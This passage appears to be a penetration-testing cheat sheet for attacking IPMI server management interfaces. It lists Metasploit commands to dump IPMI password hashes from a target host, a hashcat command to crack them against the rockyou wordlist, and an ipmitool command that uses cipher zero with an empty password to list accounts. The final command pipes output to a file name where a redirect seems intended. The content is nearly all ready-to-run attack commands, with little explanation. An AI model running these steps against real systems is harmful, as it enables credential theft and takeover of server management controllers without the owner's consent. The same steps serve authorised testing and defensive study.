
### Dump Hashes

```bash
sudo msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOST x.x.x.x
set USER_FILE users.txt
set OUTPUT_HASHCAT_FILE ipmi.hashcat
```

### Crack with Hashcat

```bash
hashcat -m 7300 ipmi.hashcat /opt/rockyou.txt --username
```

### List of Users

```bash
ipmitool -I lanplus -C 0 -H 192.168.0.145 -U admin -P "" user list | ipmi_list.txt
```

